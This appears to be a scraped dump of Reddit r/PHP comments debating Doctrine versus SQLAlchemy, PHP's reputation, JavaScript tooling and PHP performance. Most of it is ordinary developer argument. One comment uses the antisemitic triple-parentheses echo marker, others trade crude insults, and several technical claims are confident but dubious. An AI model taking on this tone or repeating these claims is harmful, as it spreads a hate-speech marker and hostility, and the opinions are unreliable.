I have no experience with SQLAlchemy's, but on their website is says: &gt; SQLAlchemy is most famous for its object-relational mapper (ORM), an optional component that provides the data mapper pattern, where classes can be mapped to the database in open ended, multiple ways - allowing the object model and database schema to develop in a cleanly decoupled way from the beginning. The Doctrine ORM also implements a data mapper pattern, so there might be similarities. On Doctrine's ORM website it says: &gt; Object relational mapper (ORM) for PHP that sits on top of a powerful database abstraction layer (DBAL). One of its key features is the option to write database queries in a proprietary object oriented SQL dialect called Doctrine Query Language (DQL), inspired by Hibernates HQL. This provides developers with a powerful alternative to SQL that maintains flexibility without requiring unnecessary code duplication. 
Becauae programmers like languages that make them feel better than other people. The more complicated, esoteric, and contrived, the better. 
yes !
Less than making a full http call as you already have an open connection
Would be easier to find code mistakes if you formatted your code like a sane person.
Doctrine is a little outdated but battle-tested ORM that implements the Data Mapper pattern similar to SQLAlchemy. Once you know how it works it's probably not too heavy, but it wouldn't be my first choice for a new project (see: https://www.tomasvotruba.cz/blog/2017/03/27/why-is-doctrine-dying/) From what I've heard the [CakePHP ORM](https://book.cakephp.org/3.0/en/orm.html) was influenced a lot by SQLAlchemy, but there are also a few other Doctrine alternatives other there: * [Spot ORM](http://phpdatamapper.com/) * [Atlas ORM](https://github.com/atlasphp/Atlas.Orm) * [Nextras ORM](https://github.com/nextras/orm) * [Pomm](http://www.pomm-project.org/about) As always, it comes down to your needs
We're doing this now for an industry with deep pockets. Laravel API, Angular front end and Ionic mobile app. Much better then all the off the shelf options.
This is a weird comment. If you're going to enforce linting rules across an org, use a linter at first place, not your hastly cobble together spaghetti. phpcs is available as a phar archive.
&gt; Doctrine is a little outdated but battle-tested ORM that implements the Data Mapper pattern similar to SQLAlchemy. &gt; So what ORM is not 'Outdated' in PHP space according to you? and what makes Doctrine 'Outdated'? 
Enough making fun of strange languages, let's talk about Kotlin.
As others have said, the SQLAlchemy ORM follows the same data-mapper pattern as Doctrine but beyond that there is a fair amount of practical difference between the two. For example, in Doctrine it is common to implement objects that abstract away common queries and these abstractions are first-class citizens in Doctrine but such things don’t exist in SQLAlchemy.
What does linting have to do with this project? This project str_replaces a space after comment starts. Unnecessary bloat to do a str_replace.
It's low effort. Just like in social circles, once you develop a bad rep (especially early on), the more difficult it is to shake that rep. More often than not, those people are too insecure in themselves and what they bring to the table to realize whether you've matured or not. It's like those guys who drive around in excessively lifted trucks with those oversized diesel exhausts that look like a semi truck's exhaust – or as I like to refer to them: small-dick syndrome. Do you really want to waste your valuable time and energy impressing someone who who uses whatever esoteric hipster language they think makes them look cool and edgy? If you want to be a "cool kid", then just be you; e.g. write your "exhaust pipe hose" code and don't give those assholes the satisfaction of a reaction. After all, this ain't high school anymore (unless it is, but same advice still applies). At the end of the day, it's you and your boss you need to care about. 
I think the blog post I linked explains it very well. It's a lot less actively maintained nowadays. I heard a few people working on a new release 3.0 now though. If you are looking for something stable and tested, sure go for Doctrine. But for example, Spot provides better defaults by not using Annotations and Proxies in my opinion. I heard of others switching from Doctrine to Spot to increase performance.
A validation layer does not belong to a template.
Are...are you saying 'anus'?
I'll just leave this here: https://imgur.com/P1cRhQu
Nyes, only a craven intellectual Redditor like me would dabble in the esoteric arts that is NyavaScript; nya ha ha ha haaaaaa.
&gt; But why use something old that was never intended to be a real language, that has been jimmy rigged into being "not that bad", when you can use a language that was designed from the ground up to be good? It's still not clear which is the best approach, since both have resulted in languages of comparable functionality. That's obvious and a troubling implication, for many.
 You successfully solved a fraction of the code style consistency problem the wrong way.
&gt; People want to fit in with what's cool (NodeJS) and claim how terrible PHP is due to reasons they can't even explain themselves. It was only recently that JS overcame its extremely negative stigma.
But the post also failed to reflect on the recent activity on Doctrine. Watch the repository and you will see there is a lot of activity recently and 3.0 is also being actively developed. Also not sure Spot provides better defaults: it may not promote annotations but requires you to extend your entities from theirs which is as bad if not worse IMO. Tbh I got no issue with annotations and proxies so that's not really compelling to me :) For what's worth, I think Pomm is the only decent alternative, all the others fail to surpass Doctrine even though Doctrine has some serious flaws/limitations.
Wordpress fever aint helping
Hmm. What is your interest in Kotlin? It seems like a "better Java" or "better C#". It's a clear step up from PHP. It is not as sophisticated as Scala, but it might be more practical for some situations, and seems to have better IDE support in InjelliJ IDEA than Scala. It remains mainstream and therefore avoids both the pitfalls and advantages of more sophisticated languages like Idris and Haskell. It doesn't seem to have the easy thread safety that Rust has. It has JavaScript transpiling support. You can make statically typed internal DSLs with it. It seems to be the most officially supported language for making Android apps now. Basically it's a good base language to use unless you specifically would benefit from advantages offered by some other language.
Who cares, I am still smiling all the way to the bank.
I hope they never stop memeing us.
r/PHP really needs a bot that just finds a link to why anything mentioned on this sub is outdated (cuz here everything always is). It would save people in this community some time lol
As far as I can tell, the hate on Javascript is still alive an well. I was actually surprised to see how Javascript was portrayed in this pic. I figured they would have used a noose or something similar to what they did for PHP. 
Thats a reply to a deleted comment currently. 
So much of the internet is written in PHP, and as a result, there is a lot of bad PHP code out there.
dead at NyavaScript, i'm going to say this all the time now
Because they're still using PHP5. These idiots don't know that every web developer starts with PHP. After getting hold of concepts, they move to so called new "cool" languages and then start bashing PHP.
It's because the ecosystem of JS is well known and that's the benefits. PHP w/ composer is not as well known and thus has the hate cult following.
Oh god, don't go to /r/web_design. It's the best and easiest framework for everything over there.
I'm going to say *Becauae* all the time now.
In my book, there's PHP and client-side PHP. You can tell which is which because client-side PHP doesn't have as many `$`.
&gt; they move to so called new "cool" languages Yeah, I don't want to code a web server for my app to run on, thanks. I'm fine with `apt install lamp-server^ composer &amp;&amp; composer install`, thanks.
Neat - I tend towards just a comment describing the available variables for the designers, but I can see the benefit in this. It'd be amazing if someone were to extend the PhpStorm Twig plugin to support autocomplete off the back of these type hints.
&gt; You also star your own shitty projects. I lol'd when I checked his stars
whatever, i still love PHP, it taught me so many things..
The real deal is... People get paid XX... cuz of XX... and maybe you saved 1 second... the person buying XX doesn't care about that second..which means they dont care about your XX. but PHP got it done for 4 bucks... when you wanted to charge 400
Because PHP is one of the, if not the, worst designed programming languages in common use. It is pervasively flawed and has no coherent design philosophy or even internal consistency. 
Since everyone else is considering only the ORM, I'll speak to the database layer side. I would say that it's quite similar to SQLAlchemy, both in design and utility. Architecturally speaking, both SQLAlchemy Core and Doctrine DBAL act as a layer on top of the language's inbuilt DB interfaces - SQLAlchemy wraps DB-API, Doctrine DBAL wraps PDO. You shouldn't see too much overhead using either of them; they don't hold extra data in memory or anything like that. Both projects provide similar functionality, such as a type system (for mapping PHP/Python types to DB types, not for hydrating full objects), a query builder, and shorthand functions for CRUD operations. Finally, both aim to provide a more consistent interface across database types, normalizing their support for bound parameters, etc.
What is the benefit?
cuz everyone whats to abstract that shit down to 'in the future, someone will upgrade my shitty/awesome code'.. but in truth, nobody upgrades your shitty/awesome code....
Lisp looks more like a used tampon. 
Because people are salty.
The ecosystem of JavaScript is a fucking disaster. And if you don't know what composer is at this point in time, you've probably never used PHP outside of WordPress.
I would say the workflow is pretty easy. Just npm install a package, it's similar to composer. 
Except my tiny little project has like 900 dependencies. There's like a 12 step process to using the latest frameworks, and each popular option does it completely differently. The dependencies you need to compile your development environment probably exceed the dependencies in your actual project. It's just a shitty time. Every player disagrees on everything and you end up with this big steaming pile of shit. PHP came together and got its shit sorted out, with stuff like PSR. The JavaScript ecosystem is incredibly immature.
Totally agree with you. I feel like JS is the new PHP actually. It’s an easy-to-learn language that’s exploding and now there are new JS devs everywhere, and within the next 5-6 years, it will be the butt of all the memes, because there’s already a TON of terrible JS code out there, and it’s really only getting worse.
its*
Its mostly because PHP as a language is not designed at all, it begun as "Personal Homepage Tools" and hacks added over the years accumulated in the mess its today. Heres a small list why PHP is so hated 1. Stdlib. This is such a mess its unreal. 2. Inconsistency. Its almost as its built-in on purpose. 3. Poor support for unicode 4. Poor support for multithreading 5. Poor/No support for concurrency 6. Extremely poor naming conventions 7. Because BC, some issues are not fixed, they are patched in crazy ways. 8. No real use case outside webpages PHP also makes its really easy to shoot yourself in the foot, twice. Usually PHP is promoted as "easy" to learn, and i cannot see how its any easier than eg. Python, Javascript, &lt;add any other dynamic language&gt; or Ruby. I also see lots of comments like "let them bash it, while i laugh while on the way to the bank" This is crazy! Salaries are usually much higher in job positions that use other languages. The other comment is "but i can deploy it so easily, just FTP and drag and drop". This is true, but it only applies to websites using a CMS, like Drupal, Joomla or wordpress. Any "real" application has a more complex deployment story, including apps built in PHP. This voids the argument. Theres also the argument "we have composer and PHP7". This should be obvious for any modern language. All the other big players have had a package manager for a long time. Seeing how to web has evolved in the past 10-15 years, im positive that the future requirements are not well suited for a language like PHP. The CPUs are not getting any faster, they just have multiple cores. The userbase and the demand for fast apps in constantly increasing. For smaller websites PHP will still be a good option. People still write Perl and even Cobol today. Maybe PHP will join them in a couple of years too. 
I have those books. I've done this (but to place my laptop higher up so as to not strain my neck looking down)! I also used the Microsoft certification books, oops
Poor dude. Frustration, loneliness and ignorance will kill you. Do something. You can't die like that. 
Theres more to an ecosystem than just the package manager. Ignoring the fact that NPM has been dealing with massive issues, and the community has fragmented (AGAIN) its package managers (npm and yarn, with bower in the past), you have multiple tools for compiling your assets for web stuff (webpack, browserify, grunt, gulp, babel, typescript, coffeescript). The ecosystem of javascript is very young and immature. It has great potential, but right now, it is indeed a disaster.
No reasons. Both can do the same things. Use whatever makes you happy. 👍🏼
Word! [LINE: 1] I see it as this, PHP users usually dont know any other language. They abstract the database with &lt;add ORM of choice&gt; and the rest is copypasted from stackoverflow. Now, they have something semi-working (lets suppress those pesky errors/notices with the '@' symbol [for real why does a language have this builtin]]) and in worst-case scenario its an app dealing with personal info, like credit cards and ssn. When the app grows the time for a hack is indeed upon them. Rinse, and repeat. GOTO [LINE1] Seriously, PHP5.3 added goto in 2009!!!! They even added a xkcd http://php.net/manual/en/control-structures.goto.php to show of the lolphpness. Its unimaginable!!
&gt; This is not a full unrestricted goto. The target label must be within the same file and context, meaning that __you cannot jump out of a function or method, nor can you jump into one.__ The usual arguments against `goto` don't apply to PHP's `goto`. If you want to criticise PHP then at least criticise it for its bad parts.
(((a used tampon)))
https://en.wikipedia.org/wiki/False_dilemma Instead of coding a web server or installing Apache you can also just use a library.
**False dilemma** A false dilemma is a type of informal fallacy in which something is falsely claimed to be an "either/or" situation, when in fact there is at least one additional option. A false dilemma can arise intentionally, when a fallacy is used in an attempt to force a choice or outcome. The opposite of this fallacy is false compromise. The false dilemma fallacy can also arise simply by accidental omission of additional options rather than by deliberate deception. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/PHP/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^| [^Donate](https://www.reddit.com/r/WikiTextBot/wiki/donate) ^] ^Downvote ^to ^remove ^| ^v0.28
&gt; most people who hate it still view it from 2005 PHP people only say this so that they never have to deal with actual criticism. The language itself is not that much of a problem anymore. There are few languages that can't be efficiently worked with without an IDE. So PHP basically requiring the use of PHP to not have the urgent feeling of wanting to hurt yourself whenever you need to know "haystack first or needle first?" is really not that much of a problem anymore. The point is PHP's architecture is caught in pre-2005 bullshittery. One process per request? The application has to boot up from nothing every time an end user wants to access a web resource? Please. This alone is PHP's biggest flaw by far. If a response is not cached modern frameworks and CMSs require a 1-10s runtime just to render it. Or 200 ms for an API response, of whi 195ms is instantiating boilerplate objects. Or that moment when you see that Websockets, or fully bidirectional communication, would be a solution but the pain you have to endure when attempting to use Websockets with PHP.
lol?
I cannot find a simple "good part" in PHP's implementation of goto.
same could be said about java or C# and even C++. So.. Not too many people write code anymore in a basic text editor. The ones which do, they know a small subset of the libraries which they use or have a manual open on a screen split next to them.
[removed]
The ability to change the point of execution to something else within 1 CPU instruction compared to quite many because PHP's functions suck performance-wise.
That's because the language was mostly designed by the people / consensus. Python to my understanding came to life from 1 guy. Any language which is designed by consensus will usually have a lot of compromise. Also not everything in php is "Not Invented Here Syndrome". That's why python gave so much out of the box. PHP just said, here is a lot of useful libraries, here you go, and didn't modify all their prototypes so they could easily integrate it into their code without complex wrapping libraries.
There is nothing wrong with liking the mess, some people are attracted to the ugly. It’s not alone in this, just popular.
Has it gotten any better at CPU usage? I wrote a web crawler in NodeJS and my usage jumped 4x what it was in PHP.
How is your comment relevant to today's standards?
npm and yarn hardly count as "fragmentation" in any significant way, they use the same package repositories. &gt;you have multiple tools for compiling your assets for web stuff (webpack, browserify, grunt, gulp, babel, typescript, coffeescript). Sorry, what? Maybe one or two of these actually compete with each other, but otherwise they come together to build a single pipeline. You use Babel, TypeScript, and CoffeeScript compilers _through_ webpack, not instead of it. You can use a task runner (Grunt, Gulp) with webpack, but webpack on its own does so many things that most projects have settled on just using webpack and NPM scripts rather than introducing a task runner for stuff you can already do with webpack.
Good job. On mobile, clicking on the menu takes you to the menu at the bottom of the page. I would expect it to have been below the menu link at the top of the page. 
Thank you. Gonna fix that soon. :)
&gt; Or 250 ms for an API response, of which 25 ms is network latency, 200ms is instantiating boilerplate objects and 25ms is actual workload as intended by business logic. What the blazing heck are you on about? Our non-cached, cold-start API responses are ~40ms, our cached ones are ~10ms, and this is using CakePHP 2.x, which isn't exactly a light framework. If your responses are slower than that, you need to do some performance profiling and fixing.
Sure you can write crappy software in any language, but why is it so evident in PHP? Because its primarily used by people who use it as a platform for webpages, usually with WordPress etc. This means they are NOT PHP devs, but more WordPress developers (mostly working with a point and click GUI tool (the CMS admin UI), and writing CSS as a primary job, mixed with some HTML, and copypasting PHP from SO). Heres lies the larger issue. Most dont know about the underlying issues and just blindly does whatever, and PHP wont guide them at all. This is evident with operators such as '@'. I have personally worked in hundreds codebases, in many different languages, and the PHP ones always are the worst. How can this be a repeating phenomenon? If you would remove Drupal, Joomla and WordPress from any ranking index, how big of a slice would PHP still have in the web? I would recon a margin of 5%. Theres obviously a job market for people building websites only, but i think it would be of great benefit for them if the underlying tech would be more robust, and had some kind of sane way of not allowing all kinds of crazy shit PHP does. But luckily the trend is finally starting to reverse, PHP is losing marketshare, as users are more aware of choices (that were very limited in the early 2000s) and choose something more modern, safe and more suitable for todays web. 
Yes, today PHP is all about AbstractInterfaceAdapterFactory. PHP devs try endlessly to write it like Java. A simple feature, that could be just one or two functions have a crazy abstraction built around it. PHP is going in the totally wrong way. 
FWIW, this was a picture taken at our local coworking space.
&gt;Everything you stated is developer issue, not a language issue. You just wrote 4 more paragraphs of developer issues, not language issues. Yes, Wordpress "developers" are the worst but you can also build modern, robust, high performance web applications with PHP7+ and frameworks like Laravel. Blame the developer, not the language. Most of the "mess" you talk about has been cleaned up in the latest versions. The only thing that still bothers me on a daily basis are the quirky naming conventions and needly/haystack disasters. &gt;If you would remove Drupal, Joomla and WordPress from any ranking index, how big of a slice would PHP still have in the web? I would recon a margin of 5%. Bullshit argument. People flock to frameworks in any language. How large would Python's share be without Diango/Flask. How much SPAs would be written in vanilla JS if you took out Ember/React/Vue?
You totally missed my point. If there is a cms for python, i can gurantee flask/django has lots of more users that that cms. In php wordpress alone trumps all frameworks together. 
Your performance numbers you state are 100% garbage, which makes me hesitate to take any of your post seriously. Try not to exaggerate with hyperbole and people would take comments more seriously.
&gt; Your performance numbers you state are 100% garbage If you say so it MUST be true!
Concurrent users = 1 in your case.
&gt; The only reason people still use it is they already know frameworks or tools that are PHP based Or... they've used other languages and frameworks that also have shortcomings as well, and moved back? I've moved in to both the java and javascript space over the last 10 years, and have come back to PHP for some newer projects. I have a colleague that is stuck working in a python CMS for the last several months. None of these other platforms are magical answers to every problem. If you were starting on a greenfield project from scratch, there are compelling reasons for multiple different languages. But getting deep in to any of them, ugly issues will still crop up. I can say the speed at which PHP starts up - like just... run "php bootstrap file" - is faster than most java framework bootstrapping processes i've used, which saves a lot of time in testing/debugging. I've hit npm-hell more times than I cared to in the last couple of years (which is a problem whether you're using JS as a main language, or just some external npm-based tools, I know). My colleague dealing with python hits multiple walls with having to maintain legacy CMS stuff with newer tools using incompatible python versions. In the java world, I've found when things work, they work well. When they don't, finding a newer version or alternative of a library can often be fruitless. Creating your own version and trying to keep it under a dependency management tool can mean having to deal with your own maven or gradle distribution setup, which, while not impossible, isn't trivial and takes you away from 'real work'. 
Even pho 7.x has a lot of problems, not the least of which is it’s willingness to just keep running almost no matter what. An example that I can think of is that I called a function (strpos I think) with one too many arguments (because a previous version of php allowed it) and instead of crashing with an error... it just returned false! Two hours later I finally figured out the cause of the odd behavior of the program.
https://imgur.com/a/HZcpn Cold caches, no cdn, fully rendered page with sql queries also not being cached and served up in that request. That's in drupal, one of the most bloated, everything and the kitchen sink cms's I've worked with. So yes, your numbers are 100% garbage and if you can't achieve a good response time in Php YOU are doing it incorrectly. Php has flaws, but your rambling is nowhere close to accurate.
^(Hi, I'm a bot for linking direct images of albums with only 1 image) **https://i.imgur.com/stdNeVZ.png** ^^[Source](https://github.com/AUTplayed/imguralbumbot) ^^| ^^[Why?](https://github.com/AUTplayed/imguralbumbot/blob/master/README.md) ^^| ^^[Creator](https://np.reddit.com/user/AUTplayed/) ^^| ^^[ignoreme](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=ignoreme&amp;message=ignoreme) 
Thank you! PHP is one of the most vibrant and welcoming communities in all of Programming. Building new libraries is easy via Packagist and with 7 it’s more OO than Python (namely actual interfaces). Let’s not forget Slack’s entire backend is PHP so it’s not all about webpages, it’s about building great software. That can be done in any language. And a developer who criticizes old code publicly because it’s old hasn’t matured in their career enough to understand they will be in the same shoes as the developer they are complaining about. PHP is a highly successful language based on what it was originally intended for, and as the internals team continues to pump out new &amp; awesome features it will only get better. 
How so? I have a lot more than 1 concurrent user, not heard of nginx?
I can fabricate shit as well, what are you using to get such bad numbers? Pure PHP can get 30-40ms easily, add junk and you slow it down, that isn’t a PHP language issue
Again all developer issues, you haven’t stated why PHP is bad, you’re rambling about bad developers. It’s More evident in PHO due to popularity and nothing more...
Lol what are you ranting about, it doesn't even makes sense at this point. Enjoy being taken seriously saying blanket statements that are wholly inaccurate. Fabricated lol. Jesus Christ.
So angry, when I get home I shall profile some of my API responses, regardless of this statement you would always have a cache, regardless of language... so the point is moot. Chill dude, why are you even subbed to PHP if you hate it, indulging much..
And this is how PHP punishes those who do not test.
just a bunch of php scripts like pre framework era
The hate I’ve seen in JavaScript is more around the rapid release of a large number of frameworks and the complexity of the built tools, and less about the language itself. The other hate I see has to do with the philisophical argument of doing JS the right way and how it seemingly bends over backwards to do some things (like classical inheritance) without actually doing them. These discussions are sometimes heated but usually civil and somewhat intelligent. The anti PHP stuff I see is mostly “hur hur PHP is dumb”. There are a lot of things wrong with PHP but there are also a ton of huge products and sites people use everyday that perform phenomenally on PHP. 
Concurrent users drifts between 1200 and ~5000 at any given moment depending on the time of day. But thanks for playing. 
it feels like someone responded to the wrong person? Aren't both of you saying the same thing? OP made up some nonsense numbers to illustrate his point, both you and the person you're arguing with are both saying that OP's numbers are nonsense and you can easily get down to 40ms. Neither you nor /u/allgood2386 seem to hate PHP.
Reddit Mobile app is not that good, maybe your right!
I used to feel this way about PHP, then I got hired on to fix a project written in PHP 7 in the laravel framework. I didn't know much about composer, or that you can adequately split business logic or write in an object oriented way. I've been impressed. There's so much terrible information on it out there, though. That's what makes the language seems terrible, imho 
That particular one bashed several languages, if you read *all* of it.
Static Typing&amp;Interfaces and make sense only in compiled languages like Java or typescript IMHO. Where you actually have a verifier for your type assertions before you run the code.
I just don't believe in scripting languages anymore for professional projects. They make it easy to start running something at the expense of everything else. Easy and fast to start running something is not the same as easy and fast to get it working.
Blame WordPress. 
You could write small programs in whatever languages made the most sense for a given feature or that the programmer assigned to that feature had the most experience with, and then all the different programs could communicate with each other over socks.
Sorry, but I fail to see this as a benefit. I cannot help but see this as a recruiting nightmare.
Going to disagree with you there. I'm a full-time front-end dev, and while the ecosystem itself is a little bit of a Wild West, more web applications are being written in a much more maintainable, scalable, and testable manner. Component-based frameworks like Vue, React, etc are bringing some sanity to people who are used to having to write jQuery spaghetti all over the place. 
But it is true. You don't know how to code? Do you want to get paid quickly? Do you not care about having limited options? Wordpress is just the solution for you.
What are you even on about? Are you angry that people use Wordpress over Python CMS because they can't put it on usual web hosting? Or what did you just try to say? Wordpress is being used only because customers want cheap websites fast, and for some 'devs' it's cheaper to just get a theme and put wordpress up. I was forced to do a web in WP once, it was the worst 2 months of my life and I'm never doing that again.
There's less mental effort required to perform maintenance as each microservice is relatively small and independent. It makes upgrades and development easier as you can easily build a mental model of the code. 
Yeah it's definitely come a long way.
I think seeing the source code would be much more helpful if you want useful feedback. Right away, I'm a concerned that the use of depreciated HTML tags, unusual CSS declaration choices (in-line styles for everything; internal CSS added in the footer), and serving pages without the ".php" file extension hidden, indicate there might be some other much more seriously issues in the code. I'm not saying that these things are bad on their own -- but together, they make me wonder just what you are doing with the password and just how "secure and private" my data would be.
Joomla! Is a perfect example of this. What the fuck is there a jdate class??? PHP has it's own date functions! It's like they just decided to rewrite all of PHP in this java-esque abstraction layer.
Yeah you are right about some things. Due to bad coding practice I used to have in php the moment I was trying to build the website, there are some issues, the bandwidth Usage just keeps increasing for every visit on the page. I don't know why this keeps happening. Regarding your concern with paswords. They are stored in a database in an encoded form, and I won't get to see nor make things with them. &gt; internal CSS added in the footer) that's bc the main page which is index.php, the moment you log in, get's information from other .html files, like right column, bottom things etc and displays them there. And for the sake of me being lazy, I didn't clear things up entirely in css files but wrote some additional css code inside those .html files which are basically used to store text, and then if you take a look at the source code you mentioned, it looks like a giant mess. PS: I still got way more to learn. I'm just last year high school.
Why aren't you using nutch, bro?
It doesn't do what I need, I need to do a very specific type of parsing, against a website that doesn't exactly meet good standards of html.
[removed]
I felt the same way. Then realized (with the help of the js sub) most of the 900 dependencies are build tools. Take angular, for example. The node modules are a transpiler, a linker, a compiler ect. It's similar to all the tools that get installed alongside visual studio for writing apps in c++ or .NET. Or maybe gcc is a better analogy. The code that comes out at the end of the build is actually quite small. It takes some getting used to, especially if you've only worked with smaller libs (like jquery or underscore) where you can just include a script tag and start coding. A lot of the libraries have come out with awesome cli's that take care of most of the setup for you and actually work really well. I was skeptical too, but coding in some of these frameworks is actually really productive (and fun) once you get used to it.
People always say this... There's a lot of bad code from every language out there. C/C++ is probably one of the worst offenders in my experience.
There is an error: Warning: file_get_contents(http://privateblog.ga/html/header.php): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in /storage/ssd5/979/2062979/public_html/index.php on line 65 Warning: file_get_contents(http://privateblog.ga/html/index_intro.php): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in /storage/ssd5/979/2062979/public_html/index.php on line 66 Warning: file_get_contents(http://privateblog.ga/html/basic_footer_black.php): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in /storage/ssd5/979/2062979/public_html/index.php on line 67
I guess I half agree. PHP will have a compile error for malformed implementations of interfaces and type errors. It just happens at runtime lol 
Sounds like a cool project
To me it seems all fine. Try please to reload the page.
As a developer the day i have to write tests for core functions is the day is quit using the language. Your argument suggests i should write a test for a function that uppercases a string? Should i also test the php return keyword? Should i test that new Class() actually returns a new instance? Again, PHP crazy talk.
PHP is fun to hack on because there’s so many things to fix or add :)
Do you fix/add to the core PHP language? Curious...
What year are you living in? You can get a cheap DO box for 5 bucks a month. Theres probably even cheaper alternatives out there. The "PHP cheap hosting" is no longer a valid argument. Im not angry at people using wordPress, on the contrary im glad theres more jobs in tech. What im concerned about is the way these poor souls are so naive they dont know no better. PHP is like every shop out there was a wallmart and every restaurant was a mac donalds. 
Now it seems to be working.
One process per request and the script living in the request scope it’s an excellent thing, keeps things simple and helps you reason about code. And the productivity of the PHP environment is unrivalled. And also you can cry as much as you want, we’ll be getting the same money as everyone else gets with other languages and probably not working with purists full of shit like you!
Literally every function in PHP can be passed as many unnecessary values as you want. Your issue was developer error. Granted breaking changes should be logged, developers need to be mindful when moving from version to the next to pay attention to what those changes are. While I am sure there are always some bugs to deal with, your particular issue was not related to a bug. 
The community around Haskell is vibrant and welcoming to, and intellectually stimulating to boot. Lots of languages have nice developer communities.
Try to explain why slack, Facebook or other big php companies are shooting themselves on the foot. Maybe you should go there and try to convince them to hire you as a consultant and help them get out of this horrible situation 
You clearly do not read or understand me. I just tried to explain that there are still people who believe in that stuff. And those people are ignorant or do not care about coding. They just 'make websites' for customers who get what they need. Life is simple like that.
&gt; Regarding your concern with paswords. They are stored in a database in an encoded form, and I won't get to see nor make things with them. If by encoded, you mean hashed, you are good. If not, please learn a bit about the difference.
&gt; Slack’s entire backend is PHP There are many other large companies that depend on PHP's runtime, but [Slack is not one of them](https://slack.engineering/taking-php-seriously-cf7a60065329)
For the most part I interchange HHVM and PHP. Syntactically the same and anymore HHVM is a needless fork of our pure bred v7 of PHP haha. But I appreciate the link. Slack engineering is always a good read!
&gt; They are stored in a database in an encoded form By which you mean you are only storing the output of the builtin `password_hash()` function, right? Not doing anything silly like rolling your own solution or mistaking **encryption** or **encoding** for **hashing**, right?
&gt; And if you don't know what composer is at this point in time, you've probably never used PHP outside of WordPress. You know that there was a time when Composer didn't exist, right?
I agree that I was doing something wrong, but the language provides little indicator about where a mistake is made, or what that mistake is. One hallmark of a language that is easy to support, and debug, is that it fails fast. If I write a line of code that has a bug on the level of passing the wrong number or types of arguments to a function call, that should be made immediately obvious.
&gt; more web applications are being written in a much more maintainable, scalable, and testable manner And even more is utter garbage.
Oh yup 😑
AFAIK it's a fork of PHP 5, with support for a bunch of new syntax, a subset of which made it into PHP 7. It's also [explicitly diverging](https://hhvm.com/blog/2017/09/18/the-future-of-hhvm.html) from PHP now.
&gt; I felt the same way. Then realized (with the help of the js sub) most of the 900 dependencies are build tools. But there's still an insane amount of little dependencies all over the place. Like, left pad. It really stems from the fact that Javascript is a shitty language and has a shitty stdlib.
I'm not a freelancer, and usually the products I work on aren't 3 month contacts where I need to spit out a template. 
Hence the, "at this point in time".
https://www.google.com/search?q=site%3Aphp.net+ajf
Care to elaborate? 
What "this" refers to if not "now"?
Correct. But alas for a time there was a “&lt;?php” at slack and they hire PHP engineers and we will hold onto that for decades lol
Doesn't your IDE provide some indication?
I am talking about now. Composer has existed for a long time.
The issue you're talking about is a lazy JS programmer that includes a module to do anything. The stdlib isn't that bad actually. Yes it doesn't have python levels of modules out of the box but you don't need 90% of them in the first place.
You probably were doing more in nodejs because of it being asynchronous vs php synchronous.
There is a lot of garbage PHP bring written too to be fair.
I've seen the hate of JS rely on how fast frameworks come and go. AngularJS was the go-to, now Angular, but wait Vue, no, I mean react, oh God you don't use react native ? It's fatigue from how many choices you get and whether that choice will be supported in half a year.
Before upgrading the version of php check the breaking changes doc... And by testing he means you would have been able to isolate what part was broken (the parts with strpos) faster.
I believe you can turn on a stricter error setting in that case.
It can't do incredibly simple and common things from the stdlib. Like cloning objects, decent pseudo-random generators, decent cross-platform AJAX, the date/time stuff in the stdlib is awful and useless, etc. I don't understand how JavaScript developers can stand to talk shit about PHP being a poor language. 
On what?
Ah, Andrea... wouldn't be the same thread without you. Be honest: if you had full power, what would you do to remedy the situation?
I use the IDE for both 5.6 and 7.1 development... that does remind me that I should flag it for different versions in different projects. Thanks :)
More what? It wasn't processing anymore pages, infact less overall because async doesn't help much with http requests, and I can run 4 php streams together which beat it.
So I need to install the SPL_Type extension in order to use a SplEnum class. No thanks
This sound like the perfect machine learning question, but probably better just writing some logic 
This is the right answer.
Yeah - machine learning would be perfect, but for the size of the project it seems like too much effort to put into it.
If you have enough example data something like KNN would actually be easy to implement. I might even try something as a hobby. 
Dates are a pain in the ass, but object cloning is built in. Check out Object.create. I like just, I think it's an awesome language, but it's a different paradigm than more traditional languages.
That meme graphic is ridiculously dumb. I think the problem is more like people suck at jokes rather than PHP is bad. PHP _is_ bad but it deserves better jokes.
PHP used to have very insecure defaults (request globals that allow you to set variables directly through the query string!? for example), and was, untli PHP 7, super slow, and still has some weird design decisions and warts that will always stick around since they're baked in now (like how arrays and dictionaries are the same type!?). It's a better language these days, with a better ecosystem, but it's hard to live down its history.
Don‘t get me wrong, I love Open Source and use it daily. I guess most OS projects are „improved“ by folks coming straight out of the unis with next to no real experience but they sure as hell know what is „modern“ and they have to show off, too. So they introduce one new abstraction or dependency per hour instead to create compact and minimalistic code like Donald Knuth..
PHP is a dumpster fire of a language. It's getting better but the necessity of backwards compatibility means retaining most of the ugliness. The root of this is that PHP was never designed as a language, it has grown organically over time. Features popular in other languages have been steadily added, often without regard for how they will fit into PHP. The end result are features that don't really work together(e.g. exceptions vs the PHP standard library), surprising behaviors(Lots of fun type coercion gotchas), and strange design choices(The early standard library functions are named based on when strlen() was the hash function used for function lookups.) The PHP community doesn't help either and the comments here serve as an an example; you frequently see people who get irrationally defensive over valid criticism of PHP, treating it almost as a personal attack. None of that says anything about the usefulness of the language though. Despite its flaws, it remains a useful language that is quick to write useful tools/sites with. Where a lot of the haters get it wrong is that when you're doing any kind of web development, PHP is very often the best tool for the job. There is no conflict in saying that PHP is useful while also admitting that it is deeply flawed as a language.
Yep that's exactly what I mean. I just got used to the word encode. I used `password_hash($pass, PASSWORD_DEFAULT);`, saved the hashed pass in the database, and each time a user tried to log in I validate their case using `password_verify($password, $hashed_password); -&gt; true | false` and then created a `$_SESSION`
You should be able to do this with a little SQL https://stackoverflow.com/questions/1263780/sql-find-patterns-of-records 
I don't know. Ultimately you can't fix the whole thing, it wouldn't be the same language. But there have been incremental improvements. I won't deny there's a world of difference between, say, 7.1 and 5.1. The former is much more pleasant. More than power I want time and motivation to fix things.
If you are working with ember data or JSON API in general AND Doctrine, here is a library to make rest endpoints from your entities automagically: https://github.com/oligus/jad
